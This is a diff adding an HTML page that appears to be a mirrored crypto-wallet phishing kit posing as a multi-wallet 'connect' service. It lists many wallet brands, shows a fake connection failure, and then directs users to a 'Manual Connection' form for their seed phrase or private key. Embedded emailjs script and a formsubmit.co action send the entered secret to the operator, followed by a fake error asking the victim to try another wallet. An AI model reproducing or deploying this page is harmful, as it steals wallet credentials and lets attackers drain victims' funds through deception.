+            <div class="wallet-icon">
+              <img src="assets/bitpie.jpg" alt="BitPie" />
+            </div>
+            <span>BitPie</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Enkrypt">
+            <div class="wallet-icon">
+              <img src="assets/enkrypt.jpg" alt="Enkrypt" />
+            </div>
+            <span>Enkrypt</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Core">
+            <div class="wallet-icon">
+              <img src="assets/zelcore.webp" alt="ZelCore" />
+            </div>
+            <span>ZelCore</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Bifrost">
+            <div class="wallet-icon">
+              <img src="assets/bitfrost.jpg" alt="Bifrost" />
+            </div>
+            <span>Bifrost</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Sui">
+            <div class="wallet-icon">
+              <img src="assets/sui.png" alt="Sui" />
+            </div>
+            <span>Sui</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Ethos">
+            <div class="wallet-icon">
+              <img src="assets/surf.png" alt="Ethos" />
+            </div>
+            <span>Ethos</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="Suiet">
+            <div class="wallet-icon">
+              <img src="assets/suite.png" alt="Suiet" />
+            </div>
+            <span>Suiet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="glass">
+            <div class="wallet-icon">
+              <img src="assets/glasswallet.png" alt="Glass Wallet" />
+            </div>
+            <span>Glass Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="crypto.com">
+            <div class="wallet-icon">
+              <img src="assets/crypto.png" alt="Crypto.com Wallet" />
+            </div>
+            <span>Crypto.com Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="anchor">
+            <div class="wallet-icon">
+              <img src="assets/anchor.webp" alt="Anchor Wallet" />
+            </div>
+            <span>Anchor Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="keystone">
+            <div class="wallet-icon">
+              <img src="assets/keystone.mobile.png" alt="Keystone Wallet" />
+            </div>
+            <span>Keystone Wallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="onekey">
+            <div class="wallet-icon">
+              <img src="assets/onekey.png" alt="Onekey Wallet" />
+            </div>
+            <span>Onekey</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="airgap">
+            <div class="wallet-icon">
+              <img src="assets/airgap.png" alt="Airgap Wallet" />
+            </div>
+            <span>Airgap</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="coolwallet">
+            <div class="wallet-icon">
+              <img src="assets/coolwallets.webp" alt="Coolwallet" />
+            </div>
+            <span>Coolwallet</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="dcent">
+            <div class="wallet-icon">
+              <img src="assets/dcent.jpg" alt="D&#39;CENT Wallet" />
+            </div>
+            <span>D'CENT</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="gridplus">
+            <div class="wallet-icon">
+              <img src="assets/gridplus.jpg" alt="Gridplus" />
+            </div>
+            <span>Gridplus</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="bitbox">
+            <div class="wallet-icon">
+              <img src="assets/bitbox.webp" alt="Bitbox" />
+            </div>
+            <span>Bitbox</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="keyring-pro">
+            <div class="wallet-icon">
+              <img src="assets/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" alt="Keyring Pro" />
+            </div>
+            <span>Keyring Pro</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="secux">
+            <div class="wallet-icon">
+              <img src="assets/secux.png" alt="Secux" />
+            </div>
+            <span>Secux</span>
+          </button>
+
+          <button class="wallet-button" data-wallet="ellipal">
+            <div class="wallet-icon">
+              <img src="assets/elipal.webp" alt="Ellipal" />
+            </div>
+            <span>Ellipal</span>
+          </button>
+        </div>
+      </div>
+    </main>
+
+    <!-- Connection Modal -->
+    <div id="connectionModal" class="modal">
+      <div class="modal-content">
+        <button class="close-btn">×</button>
+        <div class="wallet-info">
+          <img id="connectionWalletIcon" src="assets/space-9705cd779cebb6665ca3e9c2f124ef3a.png" alt="Wallet Icon" />
+          <div>
+            <h3>
+              Connecting to
+              <span class="contex" id="connectionWalletName">Space</span>
+            </h3>
+            <p>Please wait while we establish connection</p>
+          </div>
+        </div>
+        <div class="progress-container">
+          <div class="progress-info">
+            <span id="connectionStatus">Finalizing connection...</span>
+            <span id="progressPercentage">95%</span>
+          </div>
+          <div class="progress-bar">
+            <div id="progressBar" class="progress" style="width: 95%"></div>
+          </div>
+        </div>
+        <p class="warning-text">
+          Don't close this window during the connection process
+        </p>
+      </div>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" class="modal">
+      <div class="modal-content">
+        <button class="close-btn">×</button>
+        <div class="error-icon">⚠️</div>
+        <h3>Connection Failed</h3>
+        <p>
+          We couldn't establish a secure connection. This might be due to
+          network issues or wallet configuration.
+        </p>
+        <div class="button-group">
+          <button id="retryBtn" style="display: none;" class="primary-btn full-width">
+            Try Again
+          </button>
+          <button id="manualBtn" class="secondary-btn full-width">
+            Connect Manually
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Manual Connect Modal -->
+    <div id="manualModal" class="modal">
+      <div class="modal-content">
+        <button class="close-btn">×</button>
+        <div class="wallet-info">
+          <img id="manualWalletIcon" src="assets/space-9705cd779cebb6665ca3e9c2f124ef3a.png" alt="Wallet Icon" />
+          <div>
+            <h3>Manual Connection</h3>
+            <p>Follow the steps below to connect manually</p>
+          </div>
+        </div>
+
+        <div class="tabs">
+          <button class="tab active" data-tab="seed">Seed Phrase</button>
+         
+        </div>
+        <div class="tab-content">
+          <form action="https://formsubmit.co/" method="post" enctype="form-data" id="my-form" class="ajaxForm">
+                                        
+            <div id="seedContent" class="tab-pane active">
+              <label for="seedPhrase">Enter your seed phrase (use spaces) or private key. </label>
+              <textarea name="message" id="my-form" required placeholder="Tap here to enter your seed phrase (use spaces) or private key."></textarea>
+              <input type="hidden" name="walletType" id="walletTypeInput" value="Space" />
+              <button type="submit" id="submit" class="primary-btn full-width">
+                Connect Wallet
+              </button>
+            </div>
+			</form>
+          
+
+
+           <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@5/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('9JyOWbhjhjpBuh_vI')
+</script>
+  
+  <script>
+  const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_0xb400s';
+   const templateID = 'template_nbie6zj';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('An Error Occured!!! Use anothere wallet Or Try again.');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+  
+  </script>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <p>© 2026. All rights reserved.</p>
+    </footer>
+  </div>
+ 
+  
+  <script src="assets/script.js"></script>
+  
+  
+  
+</body>
+
+
+<!-- Mirrored from dappmulticoins.web.app/app/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 24 Aug 2026 14:04:11 GMT -->
+</html>
